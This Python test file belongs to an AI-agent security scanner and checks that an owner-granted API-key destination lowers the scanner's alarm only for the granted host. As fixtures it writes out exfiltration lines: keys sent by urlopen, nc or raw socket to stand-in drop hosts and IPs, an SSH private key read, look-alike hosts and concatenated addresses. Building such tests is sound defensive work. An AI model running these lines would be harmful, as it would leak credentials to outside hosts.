"""The owner ties an API key to the host it is meant for: the `credential` grant.

The credential-home check relieves a key read from the agent's env file and sent only to its own service, but only
for the services the entity library lists. A `credential` grant (`NAME@host`, the name may be a `PREFIX*`, the host
may be `*.example.com`) tells the check the same for any other service: a granted (name, host) pair counts exactly
as a library entry, and every other condition of the check still holds. Where the grant made the check hold, the
granted host also loses its unknown-party distrust and agent-chosen origin on that call. A reviewed send that fails
the check only because its host is unlisted is offered the grant as a hint, verified by scoring the call again with
the grant in place.
"""

from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest
from test_aira_detectors import planir
from test_credential_home import (
    HELD,
    HOME,
    HOME_HOST,
    REQUEST,
    V5,
    V7,
    case,
    code,
    codes,
    decide,
    floors,
    scan,
)

from sentrook.prepare.credential_home import parse_credential_pattern

NAME = "EXAMPLE_API_KEY"
#: Nothing in the library: the service is the owner's own.
EMPTY = {"entities": []}
#: The library lists the provider host with no credential names (an ordinary known-good API host).
LISTED_NO_NAMES = {"entities": [{k: v for k, v in HOME.items() if k != "credential_names"}]}


def grant(
    pattern: str = f"{NAME}@{HOME_HOST}",
    *,
    ref: str = "g_cred",
    scope: str = "persistent",
    session_ref: str | None = None,
    expires_at: str | None = None,
    kind: str = "credential",
) -> dict:
    g = {
        "grant_ref": ref,
        "kind": kind,
        "pattern": pattern,
        "granted_at": "2026-10-01T09:00:00Z",
        "scope": scope,
    }
    if session_ref is not None:
        g["session_ref"] = session_ref
    if expires_at is not None:
        g["expires_at"] = expires_at
    return g


def granted(raw: dict, *grants: dict) -> dict:
    raw = copy.deepcopy(raw)
    raw["grants"] = [*raw.get("grants", []), *grants]
    return raw


def gscan(raw: dict, oracle: dict | None = None, **kw):
    return scan(raw, oracle=oracle if oracle is not None else EMPTY, **kw)


def assert_held(res, *, grant_ref: str = "g_cred") -> None:
    r = res.response
    assert res.prepared.credential_home_check == "ok"
    assert res.prepared.credential_home.grants
    assert r.floors_applied == [] and r.risk < 45 and decide(r) == "allow"
    relief = [x for x in r.relief_applied if x.grant_ref == grant_ref]
    assert relief and relief[0].effect.startswith("sensitivity")
    host = res.prepared.credential_home.grants[0][0]
    # the granted host is relieved of its distrust and origin, by the grant or by a rule that got there first
    assert any(x.subject == host and "distrust" in x.effect for x in r.relief_applied)


def assert_grant_fires(raw: dict, why: str, *, oracle: dict | None = None, **kw) -> None:
    """The grant does not make the check hold: the call scores as it does with no grant at all."""
    res = gscan(raw, oracle, **kw)
    assert res.prepared.credential_home is None
    assert res.prepared.credential_home_check == why
    assert "sensitive_data_sent" in floors(res) and res.response.risk >= 60
    bare = copy.deepcopy(raw)
    bare["grants"] = [g for g in bare["grants"] if g["kind"] != "credential"]
    assert res.response.risk == gscan(bare, oracle, **kw).response.risk


# --------------------------------------------------------------------------- must stay silent


@pytest.mark.parametrize("trigger", ["message", "scheduled"])
def test_the_key_sent_only_to_its_granted_host_is_silent(trigger):
    raw = case(
        trigger=trigger,
        request=REQUEST if trigger == "message" else f"Daily: list pages via {HOME_HOST}.",
    )
    before = gscan(raw)
    assert before.prepared.credential_home_check == "unlisted_host"
    assert "sensitive_data_sent" in floors(before) and before.response.risk >= 60
    res = gscan(granted(raw, grant()))
    assert_held(res)
    assert res.prepared.credential_home.names == (NAME,)
    assert "relief.credential_grant" in codes(res)


def test_a_granted_name_pattern_is_silent():
    assert_held(gscan(granted(case(), grant(f"EXAMPLE_*@{HOME_HOST}"))))


@pytest.mark.parametrize("host", ["eu." + HOME_HOST, HOME_HOST, "example.invalid"])
def test_a_host_the_grant_pattern_covers_is_silent(host):
    assert_held(gscan(granted(case(code(host=host)), grant(f"{NAME}@*.example.invalid"))))


def test_a_session_grant_in_its_own_session_is_silent():
    assert_held(gscan(granted(case(), grant(scope="session", session_ref="s_t"))))


def test_a_grant_adds_names_to_a_library_entry():
    # the library lists the host for other names; the grant adds the owner's own key for it
    raw = case(code(name="EXAMPLE_ADMIN_TOKEN"))
    assert gscan(raw, HELD_ORACLE).prepared.credential_home_check == "name_not_listed"
    res = gscan(granted(raw, grant(f"EXAMPLE_ADMIN_TOKEN@{HOME_HOST}")), HELD_ORACLE)
    assert res.prepared.credential_home_check == "ok"
    assert res.response.floors_applied == [] and decide(res.response) == "allow"


def test_a_known_good_host_without_names_takes_the_grant():
    assert_held(gscan(granted(case(), grant()), LISTED_NO_NAMES))


def test_the_key_from_a_sourced_env_file_in_a_shell_command_is_silent():
    cmd = (
        "set -a; . ~/.hermes/.env; set +a; "
        f'curl -s -H "Authorization: Bearer $EXAMPLE_TOKEN" https://{HOME_HOST}/v1/users/me 2>/dev/null'
    )
    raw = planir("terminal", "exec", {"command": cmd}, platform="hermes", request=REQUEST)
    res = gscan(granted(raw, grant(f"EXAMPLE_TOKEN@{HOME_HOST}")))
    assert res.prepared.credential_home_check == "ok"
    assert res.response.floors_applied == [] and res.response.risk < 45


HELD_ORACLE = {"entities": [HOME]}


# --------------------------------------------------------------------------- must fire


@pytest.mark.parametrize("host", ["paste.example.invalid", "collector.unknown.invalid"])
def test_the_granted_key_sent_to_another_host_fires(host):
    assert_grant_fires(granted(case(code(host=host)), grant()), "unlisted_host")


def test_the_granted_key_sent_to_a_near_miss_of_the_granted_host_fires():
    assert_grant_fires(granted(case(code(host="api.examp1e.invalid")), grant()), "unlisted_host")
    assert_grant_fires(
        granted(case(code(host=HOME_HOST + ".attacker.invalid")), grant()), "unlisted_host"
    )


def test_the_granted_key_sent_home_and_to_another_host_fires():
    extra = "urllib.request.urlopen('https://drop.unknown.invalid/u', data=k.encode())\n"
    assert_grant_fires(granted(case(code(extra=extra)), grant()), "unlisted_host")


def test_a_different_key_name_fires():
    assert_grant_fires(granted(case(code(name="OTHERVENDOR_API_KEY")), grant()), "name_not_listed")
    # a name the pattern's prefix does not cover
    assert_grant_fires(
        granted(case(code(name="EXAMPLEX_API_KEY")), grant(f"EXAMPLE_*@{HOME_HOST}")),
        "name_not_listed",
    )


@pytest.mark.parametrize(
    "extra",
    [
        "open('/tmp/k.txt','w').write(k)\n",
        "print(k)\n",
    ],
)
def test_the_granted_key_also_written_or_printed_fires(extra):
    assert_grant_fires(granted(case(code(extra=extra)), grant()), "key_put_elsewhere")


def test_another_sensitive_file_in_the_call_fires():
    extra = "kid=open(os.path.expanduser('~/.ssh/id_ed25519')).read()\n"
    assert_grant_fires(granted(case(code(extra=extra)), grant()), "other_sensitive_file")


def test_a_granted_host_only_content_named_fires():
    assert_grant_fires(
        granted(case(), grant()),
        "host_from_content",
        state={**HELD, "untrusted_entities": [HOME_HOST]},
    )


@pytest.mark.parametrize(
    "g",
    [
        grant(expires_at="2026-10-05T10:00:00Z"),
        grant(scope="session", session_ref="s_other"),
        grant(scope="session"),
    ],
    ids=["expired", "other_session", "unbound_session"],
)
def test_a_lapsed_grant_fires(g):
    assert_grant_fires(granted(case(), g), "unlisted_host")


@pytest.mark.parametrize(
    "pattern",
    [
        f"*@{HOME_HOST}",
        f"EX*@{HOME_HOST}",
        f"*_API_KEY@{HOME_HOST}",
        f"{NAME}@*",
        f"{NAME}@*.invalid",
        f"{NAME}@*.*",
        NAME,
        HOME_HOST,
        f"{NAME}@https://{HOME_HOST}/",
        f"{NAME}@{HOME_HOST}:443",
        f"{NAME}@api.*.invalid",
        f"{NAME}@{HOME_HOST}@x.invalid",
        f"{NAME}@*.co.uk",
        f"{NAME}@*.com.au",
        f"{NAME}@*.113.9",
        f"{NAME}@*.0.113.9",
    ],
)
def test_an_over_broad_or_malformed_pattern_relieves_nothing(pattern):
    assert parse_credential_pattern(pattern) is None
    assert_grant_fires(granted(case(), grant(pattern)), "unlisted_host")


def assert_check_fails(raw: dict, why: str | None, *, floor: bool = True, **kw) -> None:
    res = gscan(raw, **kw)
    assert res.prepared.credential_home is None
    if why is not None:
        assert res.prepared.credential_home_check == why
    else:
        assert res.prepared.credential_home_check not in (None, "ok")
    if floor:
        assert "sensitive_data_sent" in floors(res)


IP = "203.0.113.9"


@pytest.mark.parametrize(
    "extra",
    [
        f"import subprocess; subprocess.run(['nc','{IP}','9'], input=k.encode())\n",
        f"import socket; socket.create_connection(('{IP}', 9)).send(k.encode())\n",
    ],
    ids=["nc", "socket"],
)
def test_a_key_sent_by_a_route_code_opens_itself_fires_even_to_a_granted_host(extra):
    from test_credential_home import READ_KEY

    raw = case(READ_KEY.format(name=NAME) + extra)
    # the host is written and granted, but the route reaches whatever the program says: no relief and no hint
    # (a raw socket is not read as a send at all, so it takes no floor either way)
    assert_check_fails(
        granted(raw, grant(f"{NAME}@{IP}")), "unwritten_route", floor="socket" not in extra
    )
    assert credential_hints(gscan(raw)) == []


@pytest.mark.parametrize(
    "extra,why",
    [
        ("import os; os.system('scp /tmp/out backup:/srv/x')\n", "unwritten_route"),
        ("import subprocess; subprocess.run(['git','push','mirror'])\n", "unwritten_route"),
        (
            "urllib.request.urlopen('https://'+'drop'+'.unknown'+'.invalid/u', data=k.encode())\n",
            "address_built_at_run_time",
        ),
        ("h=os.environ['T']\nurllib.request.urlopen(f'https://{h}/u', data=k.encode())\n", None),
        ("urllib.request.urlopen('https://%s/u' % h, data=k.encode())\n", None),
    ],
    ids=["scp", "git_push", "concat", "fstring", "percent"],
)
def test_a_second_route_the_code_hides_fires(extra, why):
    # with the owner's grant, and with a library entry: either way the key may also leave for a host not written out
    assert_check_fails(granted(case(code(extra=extra)), grant()), why)
    assert_check_fails(case(code(extra=extra)), why, oracle=HELD_ORACLE)
    assert credential_hints(gscan(case(code(extra=extra)))) == []


def test_a_host_variable_in_a_shell_command_fires():
    cmd = (
        "set -a; . ~/.hermes/.env; set +a; "
        f"H={HOME_HOST}; "
        'curl -s -H "Authorization: Bearer $EXAMPLE_TOKEN" https://$H/v1/users/me'
    )
    raw = planir("terminal", "exec", {"command": cmd}, platform="hermes", request=REQUEST)
    res = gscan(granted(raw, grant(f"EXAMPLE_TOKEN@{HOME_HOST}")))
    assert res.prepared.credential_home is None


def test_a_scheme_word_and_a_base_url_constant_stay_silent():
    src = (
        code()
        .replace(f"'https://{HOME_HOST}/v1/search'", "BASE+'/v1/search'")
        .replace(
            "import os,json,urllib.request\n",
            f"import os,json,urllib.request\nBASE='https://{HOME_HOST}'\n"
            "assert BASE.split(':')[0] == 'https'\n",
        )
    )
    assert "BASE+'/v1/search'" in src
    assert_held(gscan(granted(case(src), grant())))


def test_a_destination_grant_alone_is_not_a_credential_grant():
    raw = granted(case(), grant(HOME_HOST, kind="destination", ref="g_dest"))
    res = gscan(raw)
    assert res.prepared.credential_home_check == "unlisted_host"
    assert "sensitive_data_sent" in floors(res)


def test_off_in_conv_v5():
    res = gscan(granted(case(), grant()), params=V5)
    assert res.prepared.credential_home is None
    assert "sensitive_data_sent" in floors(res)


CREDENTIAL_PATTERNS = json.loads(
    (
        Path(__file__).resolve().parents[2]
        / "integrations"
        / "fixtures"
        / "grants"
        / "credential-patterns.json"
    ).read_text()
)


@pytest.mark.parametrize("c", CREDENTIAL_PATTERNS["cases"], ids=lambda c: c["typed"])
def test_the_plugins_and_the_scanner_read_a_pattern_alike(c):
    """Shared with both plugins' grant commands."""
    parsed = parse_credential_pattern(c["typed"])
    if c["pattern"] is None:
        assert parsed is None
    else:
        assert parsed == tuple(c["pattern"].split("@"))


def test_patterns():
    assert parse_credential_pattern(f"{NAME}@{HOME_HOST}") == (NAME, HOME_HOST)
    assert parse_credential_pattern(" EXAMPLE_*@API.Example.Invalid ") == (
        "EXAMPLE_*",
        "api.example.invalid",
    )
    assert parse_credential_pattern(f"{NAME}@*.example.invalid") == (NAME, "*.example.invalid")
    assert parse_credential_pattern(f"{NAME}@203.0.113.7") == (NAME, "203.0.113.7")
    assert parse_credential_pattern(f"{NAME}@*.example.co.uk") == (NAME, "*.example.co.uk")
    assert parse_credential_pattern(f"{NAME}@*.example.io") == (NAME, "*.example.io")


# --------------------------------------------------------------------------- the hint


def credential_hints(res) -> list:
    return [h for h in res.response.grant_hints if h.kind == "credential"]


def test_a_reviewed_key_send_to_an_unlisted_host_is_offered_the_grant():
    raw = case()
    res = gscan(raw)
    assert decide(res.response) != "allow"
    hints = credential_hints(res)
    assert len(hints) == 1
    h = hints[0]
    assert h.pattern == f"{NAME}@{HOME_HOST}" and h.scope == "persistent"
    assert h.risk < 45 and h.subject in res.response.entities
    assert res.response.entities[h.subject].display == HOME_HOST
    assert "floor.sensitive_data_sent" in h.relieves
    # the hint as the owner would set it lets the next call through
    again = gscan(granted(raw, grant(h.pattern, ref="g_hint")))
    assert_held(again, grant_ref="g_hint")
    assert credential_hints(again) == []


def test_a_scheduled_run_is_offered_the_grant():
    raw = case(trigger="scheduled", request=f"Daily: list pages via {HOME_HOST}.")
    assert len(credential_hints(gscan(raw))) == 1


def test_the_hint_scan_leaves_the_session_state_alone():
    raw = case()
    res = gscan(raw)
    assert credential_hints(res)
    plain = gscan(raw, params=V7)
    assert res.response.state == plain.response.state


@pytest.mark.parametrize(
    "why,raw,kw",
    [
        ("library host", case(), {"oracle": HELD_ORACLE}),
        (
            "two hosts",
            case(code(extra="urllib.request.urlopen('https://drop.unknown.invalid/u')\n")),
            {},
        ),
        ("printed", case(code(extra="print(k)\n")), {}),
        ("near miss", case(code(host="api.examp1e.invalid")), {"oracle": HELD_ORACLE}),
        ("content host", case(), {"state": {**HELD, "untrusted_entities": [HOME_HOST]}}),
        ("conv-v5", case(), {"params": V5}),
    ],
)
def test_no_hint(why, raw, kw):
    oracle = kw.pop("oracle", None)
    assert credential_hints(gscan(raw, oracle, **kw)) == [], why


@pytest.mark.parametrize(
    "host", [HOME_HOST + ".evil.invalid", "api.examp1e.invalid"], ids=["embeds", "near_miss"]
)
def test_no_hint_for_a_look_alike_of_a_granted_host(host):
    raw = granted(case(code(host=host)), grant())
    res = gscan(raw)
    assert res.prepared.credential_home_check == "unlisted_host"
    assert credential_hints(res) == []
    # the same send with no grant to imitate is offered one
    assert len(credential_hints(gscan(case(code(host=host))))) == 1


def test_no_hint_on_someone_elses_turn():
    raw = case()
    raw["trigger"]["sender"] = {"relation": "other", "basis": []}
    assert credential_hints(gscan(raw)) == []


def test_no_hint_in_a_tainted_session():
    assert credential_hints(gscan(case(), state={**HELD, "tainted": True})) == []
